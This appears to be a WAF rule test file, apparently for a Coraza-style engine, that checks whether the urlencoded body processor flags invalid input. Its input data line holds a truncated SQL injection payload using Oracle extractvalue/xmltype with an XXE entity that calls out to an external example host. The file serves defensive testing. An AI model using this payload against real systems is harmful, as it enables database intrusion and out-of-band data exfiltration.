meta.author: jptosso
meta.description: Test if the body processors work
meta.name: posturlencoded.yaml

rules:
SecRequestBodyAccess On
SecAction "id:1, phase:1, ctl:forceRequestBodyVariable=on"
# urlencoded_error must be set because of the invalid payload
SecRule &URLENCODED_ERROR "!@eq 0" "id: 100, log"

input.data: var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;
